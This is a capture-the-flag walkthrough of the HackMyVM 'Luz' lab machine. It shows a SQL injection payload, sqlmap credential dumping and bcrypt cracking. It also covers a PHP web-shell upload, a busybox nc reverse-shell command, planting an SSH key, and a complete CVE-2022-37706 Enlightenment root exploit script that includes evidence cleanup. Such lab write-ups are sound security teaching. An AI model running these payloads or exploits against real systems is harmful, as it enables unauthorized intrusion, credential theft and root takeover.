# Luz

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Luz | sml | Beginner | HackMyVM |

**Summary:** Luz is a beginner-level vulnerable machine from HackMyVM that demonstrates common web application security flaws and Linux privilege escalation techniques. The exploitation path begins with discovering an Online Food Ordering System V2 application running on nginx 1.18.0 and OpenSSH 8.9p1 on Ubuntu. The admin login portal is vulnerable to SQL injection via a time-based blind attack in the username parameter. Using SQLMap, credentials for the user `hadmin` are extracted from the MySQL database (`fos`), and the bcrypt hash is successfully cracked to reveal the password. After authenticating to the admin panel, an arbitrary file upload vulnerability in the Site Settings functionality allows uploading a PHP web shell disguised as an image. The web shell provides remote code execution, which is leveraged to establish a reverse shell as `www-data`. Lateral movement to user `aelis` is achieved by exploiting a misconfigured SUID binary (`/usr/bin/bsd-csh`) that grants effective user ID escalation. Finally, privilege escalation to root is accomplished by exploiting CVE-2022-37706, a vulnerability in the Enlightenment window manager's SUID binaries (`enlightenment_sys`), which allows arbitrary command execution with root privileges.

---

## Reconnaissance

### Network Discovery

The initial network scan using a PowerShell script identified a VirtualBox VM running at IP address `192.168.100.83`:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.83 08:00:27:D7:FE:0F VirtualBox
```

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was performed to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ nmap -sV -sC -p- -T4 192.168.100.83
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 10:39 WIB
Nmap scan report for 192.168.100.83
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 5f:9e:28:74:86:8e:d7:5b:bd:96:00:4b:d0:7f:56:e3 (ECDSA)
|_  256 fb:3b:fd:9c:9f:4a:7c:8c:1e:a8:27:e2:8d:bf:2b:e5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
```

**Key Findings:**
- **Port 22 (SSH)**: OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
- **Port 80 (HTTP)**: nginx 1.18.0 running on Ubuntu, serving a PHP application with PHPSESSID cookies (httponly flag not set)

### Web Application Analysis

Accessing port 80 via a web browser revealed an "Online Food Ordering System V2" application:

![port 80](image.png)

The application features a typical food ordering interface with navigation options including Home, Cart, About, Login, and Admin Login.

Navigating to the Admin Login page presented a credential-based authentication form:

![admin login](image-1.png)

---

## Initial Access

### SQL Injection Vulnerability Discovery

To test for SQL injection vulnerabilities, the POST request to the admin login endpoint was intercepted:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ cat req.txt
POST /admin/ajax.php?action=login HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: id,en-US;q=0.9,en;q=0.8,id-ID;q=0.7,la;q=0.6
Connection: keep-alive
Content-Length: 29
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=pe9u34vjgf4b0cdae1r3f8j4ph
Host: 192.168.100.83
Origin: http://192.168.100.83
Referer: http://192.168.100.83/admin/login.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest

username=admin&password=admin
```

The captured request was saved to `req.txt` and used with SQLMap to test for SQL injection vulnerabilities.

### Database Enumeration with SQLMap

Running SQLMap against the login endpoint successfully identified a **time-based blind SQL injection** vulnerability in the `username` parameter:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ sqlmap -r req.txt --batch -dbs
...
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 9427 FROM (SELECT(SLEEP(5)))ivpe) AND 'NMVV'='NMVV&password=admin
---
...
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
...
available databases [5]:
[*] fos
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
...
```

**Key Findings:**
- The `username` parameter is vulnerable to time-based blind SQL injection
- Backend database: MySQL >= 5.0.12 (MariaDB fork)
- Target database: `fos`

### Extracting Database Tables

Enumerating the `fos` database revealed 8 tables:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ sqlmap -r req.txt --batch -D fos --tables
...
Database: fos
[8 tables]
+-----------------+
| cart            |
| category_list   |
| order_list      |
| orders          |
| product_list    |
| system_settings |
| user_info       |
| users           |
+-----------------+
...
```

The `users` table is the primary target for credential extraction.

### Extracting User Credentials

Examining the structure of the `users` table:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ sqlmap -r req.txt --batch -D fos -T users --columns
...
Database: fos
Table: users
[5 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| name     | varchar(200) |
| type     | tinyint(1)   |
| id       | int(30)      |
| password | varchar(200) |
| username | text         |
+----------+--------------+
...
```

Dumping the `username` and `password` columns:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ sqlmap -r req.txt --batch -D fos -T users -C username,password --dump
...
Database: fos
Table: users
[2 entries]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| staff    | $2y$10$DJbGDnA6bkOiS0TW08R5FOPruw0wRW4maShgWK8k6FlEfgNjbXsvm |
| hadmin   | $2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG |
+----------+--------------------------------------------------------------+
...
```

### Password Cracking

The extracted bcrypt hashes were saved to `hash.txt` and cracked using Hashcat with the rockyou.txt wordlist:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
...
$2y$10$efDvenHYJ5Fu/xxt1ANbXuRx5/TuzNs/s4k6keUiiFvr2ueE0GmrG:a[REDACTED]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
...
```

**Credentials:**
- Username: `hadmin`
- Password: `a[REDACTED]`

### Authenticated Access and File Upload Vulnerability

After successfully logging in with `hadmin:a[REDACTED]`, the admin dashboard was accessible:

![image](image-2.png)

The admin panel includes various features such as Home, Orders, Menu, Category List, Users, and **Site Settings**. The Site Settings section contains a file upload functionality that accepts image files.

Inspecting the page source revealed the endpoint where uploaded files are stored:

![alt text](image-3.png)

The source code shows that uploaded images are stored in the `../assets/img/` directory with a timestamp prefix (e.g., `1673244660_food-bg.jpg`).

### Exploiting File Upload for Remote Code Execution

A PHP web shell payload was prepared with the following content:

![payload](image-4.png)

The file was named `shell.php` and uploaded through the Site Settings image upload form. After uploading and saving, the source code was inspected to identify the exact filename:

![shell](image-5.png)

The uploaded file path was revealed as:
```
../assets/img/1770266580_shell.php
```

Accessing the web shell with a test command (`?cmd=id`) confirmed remote code execution:

![alt text](image-6.png)

The response displayed.

### Establishing a Reverse Shell

A netcat listener was set up on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

The reverse shell payload was URL-encoded and executed via the web shell:

**Payload:**
```
busybox%20nc%20192.168.100.1%204444%20-e%20%2Fbin%2Fbash
```

The full URL to trigger the reverse shell:

![revshell](image-7.png)

The reverse shell successfully connected:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 61595
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@luz:~/html/fos/assets/img$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

www-data@luz:~/html/fos/assets/img$ export TERM=xterm-256color
www-data@luz:~/html/fos/assets/img$ stty rows 60 cols 116
www-data@luz:~/html/fos/assets/img$
```

The shell was upgraded to a fully interactive TTY using Python PTY and proper terminal settings.

---

## Privilege Escalation

### User Flag Discovery

Navigating to the `www-data` home directory revealed the user flag:

```bash
www-data@luz:~/html/fos/assets/img$ cd
www-data@luz:~$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Jan 11  2023 .
drwxr-xr-x 13 root     root     4096 Jan 11  2023 ..
drwxr-xr-x  3 www-data www-data 4096 Jan 11  2023 html
www-data@luz:~$ cd html
www-data@luz:~/html$ ls -la
total 16
drwxr-xr-x 3 www-data www-data 4096 Jan 11  2023 .
drwxr-xr-x 3 root     root     4096 Jan 11  2023 ..
drwxr-xr-x 7 www-data www-data 4096 Jan 11  2023 fos
-rw------- 1 www-data www-data   15 Jan 11  2023 user.txt
www-data@luz:~/html$ ls -la /home
total 12
drwxr-xr-x  3 root  root  4096 Jan 11  2023 .
drwxr-xr-x 19 root  root  4096 Jan 11  2023 ..
drwxr-x---  5 aelis aelis 4096 Jan 11  2023 aelis
```

There is a user named `aelis` on the system. The user flag is readable by `www-data`.

### Lateral Movement to User aelis

Searching for SUID binaries to identify potential privilege escalation vectors:

```bash
www-data@luz:~/html$ find / -type f -perm -u=s -exec ls -la {} \; 2>/dev/null
...
-rwsr-sr-x 1 aelis aelis 170608 Oct 26  2021 /usr/bin/bsd-csh
...
```

**Critical Finding:** The `/usr/bin/bsd-csh` binary has the SUID bit set and is owned by user `aelis`. This means executing it will run with the effective user ID of `aelis`.

Exploiting the SUID binary to escalate to `aelis`:

```bash
www-data@luz:~/html$ /usr/bin/bsd-csh -b
% pwd
/var/www/html
% id
uid=33(www-data) gid=33(www-data) euid=1000(aelis) egid=1000(aelis) groups=1000(aelis),33(www-data)
```

The effective user ID (euid) is now `aelis` (UID 1000), allowing access to `aelis`'s resources.

### Establishing Persistent SSH Access as aelis

To establish a more stable connection, SSH keys were generated on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ ssh-keygen -t rsa -N "" -f id_rsa_aelis
Generating public/private rsa key pair.
Your identification has been saved in id_rsa_aelis
Your public key has been saved in id_rsa_aelis.pub
The key fingerprint is:
SHA256:4pbuIxw0CrD++gZZ1s1NLvlcknIP5kxNdHexsjSfTdQ ouba@CLIENT-DESKTOP
The key's randomart image is:
+---[RSA 3072]----+
|          .. . o=|
|.        . .. ..E|
|..  . o = +  + ..|
|o  oo. * X o. =.o|
|..+o .. S =  . o.|
| +. .. o = .     |
|  o. .+          |
|   ooo.          |
| .+. oo.         |
+----[SHA256]-----+

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ cat id_rsa_aelis.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC9VJ43WJAOspjIb4+BXXT/rVqswNEm7+GF8BKn8+IsZSIGUVOMzsc+PblRYVasMuRUX9tdF7Tx+19vBn1dURCHs13o3w3f9+A4wa7Z6TamxwYgQdnnY0TC4X4lWx0gG2+PyrLwJfjNGieQMas/yYQEsg25PZOkblpQI6JNpaynW5xcsWKbC8CD1xNUYNp+XDQEvV9QUKfeG6EkHJQILKw5nv6H5Cbb73qOUk1qpe7g3iBzmR2eb7vnP6upw1zNiXgCD7TrPVSFqiFlgO+tEETFSoM4D68sEoJ8wCbSLj+FqspRUl0hg7aXKPJX1+3uJ6FT4cyRiZVo7+5KipZON9zwPy+7UOWF5YMZ3kmgMHERp33J3In3LYmJx+LxmMa9ocekyl9Rj6u61BkpAH072uYnCKNXqsMdbdf9++ugTcHE0LCF9hImiN8k6I9jn+iiQSJBI/2Cl2RuIF2dQdEDNq/qVDdvakY5O10gf/eUT/JQrqU8rBem6WfQTLdwG7T1SZ0= ouba@CLIENT-DESKTOP
```

The public key was added to `aelis`'s `authorized_keys` file:

```bash
% cd /home/aelis
% ls -la
total 12168
drwxr-x--- 5 aelis aelis     4096 Jan 11  2023 .
drwxr-xr-x 3 root  root      4096 Jan 11  2023 ..
-rw------- 1 aelis aelis       49 Jan 11  2023 .Xauthority
lrwxrwxrwx 1 aelis aelis        9 Jan 11  2023 .bash_history -> /dev/null
-rw-r--r-- 1 aelis aelis      220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 aelis aelis     3771 Jan  6  2022 .bashrc
drwx------ 2 aelis aelis     4096 Jan 11  2023 .cache
drwxrwxr-x 3 aelis aelis     4096 Jan 11  2023 .local
-rw-r--r-- 1 aelis aelis      807 Jan  6  2022 .profile
drwx------ 2 aelis aelis     4096 Feb  5 04:59 .ssh
-rw-r--r-- 1 aelis aelis        0 Jan 11  2023 .sudo_as_admin_successful
-rw-r--r-- 1 aelis aelis 12421945 Jan 11  2023 php-fos-db.zip
% cd .ssh
% ls
authorized_keys
% rm -rf authorized_keys
% ls -la
total 8
drwx------ 2 aelis aelis 4096 Feb  5 05:02 .
drwxr-x--- 5 aelis aelis 4096 Jan 11  2023 ..
% vi authorized_keys
% ls -la
total 12
drwx------ 2 aelis aelis 4096 Feb  5 05:02 .
drwxr-x--- 5 aelis aelis 4096 Jan 11  2023 ..
-rw-r--r-- 1 aelis aelis  573 Feb  5 05:02 authorized_keys
```

Logging in via SSH as `aelis`:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/luz]
└─$ ssh -i id_rsa_aelis aelis@192.168.100.83
...
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
...
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-57-generic x86_64)
...
aelis@luz:~$ id
uid=1000(aelis) gid=1000(aelis) groups=1000(aelis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd)
```

Successfully authenticated as `aelis` with full shell access.

### Root Privilege Escalation - CVE-2022-37706

Searching for additional SUID binaries as `aelis`:

```bash
aelis@luz:~$ find / -type f -perm -u=s -exec ls -la {} \; 2>/dev/null
...
-rwsr-xr-x 1 root root 22840 feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
-rwsr-xr-x 1 root root 59712 feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system
-rwsr-xr-x 1 root root 22832 feb 11  2022 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
...
```

**Critical Discovery:** Several Enlightenment window manager SUID binaries are present, including:
- `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd`
- `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_system`
- `/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`

These binaries are known to be vulnerable to **CVE-2022-37706**, a privilege escalation vulnerability in Enlightenment v0.25.3.

### Exploitation of CVE-2022-37706

The exploit script was created based on the public proof-of-concept:

```bash
aelis@luz:~$ cat exploit.sh
#!/usr/bin/bash
# CVE-2022-37706 Exploit - Enlightenment v0.25.3 Privilege Escalation

echo "CVE-2022-37706 Exploit Initiated"
echo "[*] Using known path to vulnerable binary..."

# Define the vulnerable binary path
file="/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys"

if [[ ! -x ${file} ]]; then
    echo "[-] The binary is not executable or doesn't exist."
    exit 1
fi

echo "[+] Vulnerable SUID binary found at: $file"
echo "[*] Preparing exploit directories and files..."

# Set up malicious directories and exploit script
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"
echo "/bin/bash" > /tmp/exploit
chmod +x /tmp/exploit

echo "[+] Exploit script created. Attempting to escalate privileges..."

# Trigger the vulnerability
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net

# Cleanup prompt
read -p "Press any key to clean up evidence... "
rm -rf /tmp/exploit
rm -rf /tmp/net
echo "[+] Exploit completed. All temporary files removed."
```

**Note:** This proof-of-concept is based on the exploit by [d3ndr1t30x](https://github.com/d3ndr1t30x/CVE-2022-37706.git), with the shell changed from `/bin/sh` to `/bin/bash` for compatibility.

### Executing the Exploit

Running the exploit successfully grants root privileges:

```bash
aelis@luz:~$ bash exploit.sh
CVE-2022-37706 Exploit Initiated
[*] Using known path to vulnerable binary...
[+] Vulnerable SUID binary found at: /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
[*] Preparing exploit directories and files...
[+] Exploit script created. Attempting to escalate privileges...
mount: /dev/../tmp/: can't find in /etc/fstab.
root@luz:/home/aelis# id ; whoami ; hostname
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),1000(aelis)
root
luz
root@luz:/home/aelis# cat /var/www/html/user.txt /root/root.txt
HMVn[REDACTED]
HMV3[REDACTED]
```

**Root privileges achieved!** Both the user flag and root flag have been successfully captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network discovery and port scanning, identifying SSH (22/tcp) and HTTP (80/tcp) services running nginx 1.18.0 and an Online Food Ordering System V2 PHP application on Ubuntu.

2. **Vulnerability Discovery**: Identified a time-based blind SQL injection vulnerability in the admin login endpoint (`/admin/ajax.php?action=login`) via the `username` POST parameter. Enumerated the MySQL database `fos` and extracted bcrypt password hashes for users `staff` and `hadmin` from the `users` table.

3. **Credential Compromise**: Cracked the bcrypt hash for user `hadmin` using Hashcat with the rockyou.txt wordlist, revealing the password `a[REDACTED]`. Successfully authenticated to the admin panel.

4. **Initial Exploitation**: Discovered an arbitrary file upload vulnerability in the Site Settings functionality that allowed uploading a PHP web shell disguised as an image file. Uploaded `shell.php` containing PHP Command Injection Shell to `/assets/img/1770266580_shell.php` and achieved remote code execution as `www-data`.

5. **Reverse Shell Establishment**: Leveraged the web shell to execute a reverse shell payload using `busybox nc`, establishing an interactive shell as the `www-data` user.

6. **Lateral Movement**: Discovered a misconfigured SUID binary `/usr/bin/bsd-csh` owned by user `aelis`. Executed the binary to gain effective user ID privileges as `aelis` (euid=1000). Established persistent SSH access by adding an SSH public key to `/home/aelis/.ssh/authorized_keys`.

7. **Privilege Escalation to Root**: Identified vulnerable Enlightenment window manager SUID binaries (`enlightenment_sys`) affected by CVE-2022-37706. Exploited the path traversal and command injection vulnerability by creating a malicious `/tmp/exploit` script and triggering execution through the `enlightenment_sys` SUID binary, achieving a root shell and capturing both user and root flags.